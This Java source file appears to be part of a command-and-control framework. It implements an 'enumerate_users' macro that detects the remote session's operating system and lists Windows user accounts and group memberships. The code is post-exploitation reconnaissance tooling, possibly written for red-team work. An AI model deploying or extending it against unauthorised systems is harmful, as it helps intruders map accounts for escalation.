package c2.session.macro.users;

import c2.Commands;
import c2.HarvestProcessor;
import c2.session.IOManager;
import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;

public class UserEnumeratorMacro extends AbstractCommandMacro {

	public static String COMMAND_STR = "enumerate_users";
	
	private WindowsUserEnumeratorMacro windowsMacro;
	private IOManager io;
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase("enumerate_users");
	}

	@Override
	public void initialize(IOManager io, HarvestProcessor harvestProcessor) {
		windowsMacro = new WindowsUserEnumeratorMacro(io);
		this.io = io;
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		
		io.sendCommand(sessionId, Commands.OS_HERITAGE);
		outcome.addSentCommand(Commands.OS_HERITAGE);
		String response = io.awaitMultilineCommands(sessionId);
		outcome.addResponseIo(response);
		SystemAccountProfile profile = null;
		if(response.startsWith(Commands.OS_HERITAGE_RESPONSE_WINDOWS)) {
			outcome.addMacroMessage("Proceeding with Windows enumeration");
			try {
				profile = windowsMacro.getSystemAccountProfile(sessionId, outcome);
			}catch(Exception ex) {
				outcome.addError("Error developing profile: " + ex.getMessage());
			}
		}else if(response.startsWith(Commands.OS_HERITAGE_RESPONSE_LINUX)) {
			outcome.addMacroMessage("User enumeration not supported for Linux at this time");
		}else if(response.startsWith(Commands.OS_HERITAGE_RESPONSE_MAC)) {
			outcome.addMacroMessage("User enumeration not supported for Mac at this time");
		}
		
		StringBuilder sb = new StringBuilder();
		if(profile != null) {
			for(User user : profile.getUserList()) {
				sb.append("User: " + user.username + " type " + user.type + System.lineSeparator());
				for(Group group : user.getGroups()) {
					sb.append("Group Membership: " + group.groupname + ", Type: " + group.type + System.lineSeparator());
				}
			}
		}
		
		outcome.addMacroMessage("User Profile: " + System.lineSeparator() + sb.toString());
		
		return outcome;
	}

}
